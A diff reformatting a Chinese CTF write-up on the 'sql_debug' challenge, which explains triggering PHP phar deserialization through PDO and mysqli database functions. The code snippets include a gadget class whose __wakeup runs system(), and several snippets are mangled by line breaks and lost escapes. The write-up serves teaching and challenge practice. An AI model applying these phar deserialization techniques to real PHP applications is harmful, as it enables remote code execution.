@@ -23,9 +23,11 @@ sql_debug sql_debug 题⽬介绍
 
 source/vendor/nette/database/src/Database/Connection.php
 
-<?php$pdo = new PDO(sprintf("pgsql:host=%s;dbname=%s;user=%s;password=%s", "127.0.0.1", "postgres","sx", "123456"));@$pdo->pgsqlCopyFromFile('aa', 'phar://test.phar/aa');
+<?php$pdo = new PDO(sprintf("pgsql:
+host=%s;dbname=%s;user=%s;password=%s", "127.0.0.1", "postgres","sx", "123456"));@$pdo->pgsqlCopyFromFile('aa', 'phar://test.phar/aa');
 
-<?phpclass A {public $s = '';public function __wakeup () {system($this->s); }}$m = mysqli_init();mysqli_options($m, MYSQLI_OPT_LOCAL_INFILE, true);$s = mysqli_real_connect($m, 'localhost', 'root', '123456', 'easyweb', 3306);$p = mysqli_query($m, 'LOAD DATA LOCAL INFILE 'phar://test.phar/test' INTO TABLE a LINESTERMINATED BY 'rn' IGNORE 1 LINES;');
+<?php
+class A {public $s = '';public function __wakeup () {system($this->s); }}$m = mysqli_init();mysqli_options($m, MYSQLI_OPT_LOCAL_INFILE, true);$s = mysqli_real_connect($m, 'localhost', 'root', '123456', 'easyweb', 3306);$p = mysqli_query($m, 'LOAD DATA LOCAL INFILE 'phar://test.phar/test' INTO TABLE a LINESTERMINATED BY 'rn' IGNORE 1 LINES;');
 
 那么有没有⼀种可能，还有其他的 phar 利⽤⽅式呢？
 
@@ -37,7 +39,11 @@ dsn_from_uri 触发phar反序列化
 
 跟进该函数 可以发现直接调⽤了实参 uri
 
-<?phpinclude_once "classTest.php";$dbms='mysql';$host='localhost';$dbName='test';$user='root'; $pass='';$dsn="uri:phar://phar.phar/$dbms:host=$host;dbname=$dbName";try {$dbh = new PDO($dsn, $user, $pass);$dbh = null;} catch (PDOException $e) {die ("Error!: " . $e->getMessage() . "<br/>");}$db = new PDO($dsn, $user, $pass, array(PDO::ATTR_PERSISTENT => true));?>
+<?phpinclude_once "classTest.php";$dbms='mysql';$host='localhost';$dbName='test';$user='root'; $pass='';$dsn="uri:
+phar://phar.phar/$dbms:
+host=$host;dbname=$dbName";try {$dbh = new PDO($dsn, $user, $pass);$dbh = null;} catch (PDOException $e) {die ("Error!: " . $e->getMessage() . "
+");}$db = new PDO($dsn, $user, $pass, array(PDO::
+ATTR_PERSISTENT => true));?>
 
 到这⾥这道题的解法就⾮常明朗了，接下来只需要挖⼀条 Nette 的链⼦写⼊ install.lock 打Phar就好。链⼦较为简单 不是本文的重点 这里就不贴POC了。
 
@@ -47,7 +53,8 @@ Linux下PHP内核调试⼩知识
 
 vscode的调试配置⽂件⾥ 可以把参数配置为 -S 这样就可以启动web服务，⾮常的⽅便调试。
 
-{// 使⽤ IntelliSense 了解相关属性。// 悬停以查看现有属性的描述。// 欲了解更多信息，请访问: https://go.microsoft.com/fwlink/?linkid=830387"version": "0.2.0","configurations": [{"name": "(lldb) Debug","type": "cppdbg","request": "launch","program": "/usr/local/php7.1.33/bin/php","args": ["-S","0:10001"],"stopAtEntry": false,"cwd": "${workspaceRoot}/html/", } ] }
+{// 使⽤ IntelliSense 了解相关属性。// 悬停以查看现有属性的描述。// 欲了解更多信息，请访问: https://go.microsoft.com/fwlink/?linkid=830387"version": "0.2.0","configurations": [{"name": "(lldb) Debug","type": "cppdbg","request": "launch","program": "/usr/local/php7.1.33/bin/php","args": ["-S","0:
+10001"],"stopAtEntry": false,"cwd": "${workspaceRoot}/html/", } ] }
 
 05
 
@@ -84,30 +91,17 @@ EDI安全
 
 ```
 source/vendor/nette/database/src/Database/Connection.php
-```
-
-
-
-```
-<?php$pdo = new PDO(sprintf("pgsql:host=%s;dbname=%s;user=%s;password=%s", "127.0.0.1", "postgres","sx", "123456"));@$pdo->pgsqlCopyFromFile('aa', 'phar://test.phar/aa');
-```
-
-
-
-```
-<?phpclass A {public $s = '';public function __wakeup () {system($this->s); }}$m = mysqli_init();mysqli_options($m, MYSQLI_OPT_LOCAL_INFILE, true);$s = mysqli_real_connect($m, 'localhost', 'root', '123456', 'easyweb', 3306);$p = mysqli_query($m, 'LOAD DATA LOCAL INFILE 'phar://test.phar/test' INTO TABLE a LINESTERMINATED BY 'rn' IGNORE 1 LINES;');
-```
-
-
-
-```
-<?phpinclude_once "classTest.php";$dbms='mysql';$host='localhost';$dbName='test';$user='root'; $pass='';$dsn="uri:phar://phar.phar/$dbms:host=$host;dbname=$dbName";try {$dbh = new PDO($dsn, $user, $pass);$dbh = null;} catch (PDOException $e) {die ("Error!: " . $e->getMessage() . "<br/>");}$db = new PDO($dsn, $user, $pass, array(PDO::ATTR_PERSISTENT => true));?>
-```
-
-
-
-```
-{// 使⽤ IntelliSense 了解相关属性。// 悬停以查看现有属性的描述。// 欲了解更多信息，请访问: https://go.microsoft.com/fwlink/?linkid=830387"version": "0.2.0","configurations": [{"name": "(lldb) Debug","type": "cppdbg","request": "launch","program": "/usr/local/php7.1.33/bin/php","args": ["-S","0:10001"],"stopAtEntry": false,"cwd": "${workspaceRoot}/html/", } ] }
+<?php$pdo = new PDO(sprintf("pgsql:
+host=%s;dbname=%s;user=%s;password=%s", "127.0.0.1", "postgres","sx", "123456"));@$pdo->pgsqlCopyFromFile('aa', 'phar://test.phar/aa');
+<?php
+class A {public $s = '';public function __wakeup () {system($this->s); }}$m = mysqli_init();mysqli_options($m, MYSQLI_OPT_LOCAL_INFILE, true);$s = mysqli_real_connect($m, 'localhost', 'root', '123456', 'easyweb', 3306);$p = mysqli_query($m, 'LOAD DATA LOCAL INFILE 'phar://test.phar/test' INTO TABLE a LINESTERMINATED BY 'rn' IGNORE 1 LINES;');
+<?phpinclude_once "classTest.php";$dbms='mysql';$host='localhost';$dbName='test';$user='root'; $pass='';$dsn="uri:
+phar://phar.phar/$dbms:
+host=$host;dbname=$dbName";try {$dbh = new PDO($dsn, $user, $pass);$dbh = null;} catch (PDOException $e) {die ("Error!: " . $e->getMessage() . "
+");}$db = new PDO($dsn, $user, $pass, array(PDO::
+ATTR_PERSISTENT => true));?>
+{// 使⽤ IntelliSense 了解相关属性。// 悬停以查看现有属性的描述。// 欲了解更多信息，请访问: https://go.microsoft.com/fwlink/?linkid=830387"version": "0.2.0","configurations": [{"name": "(lldb) Debug","type": "cppdbg","request": "launch","program": "/usr/local/php7.1.33/bin/php","args": ["-S","0:
+10001"],"stopAtEntry": false,"cwd": "${workspaceRoot}/html/", } ] }
 ```
 
 
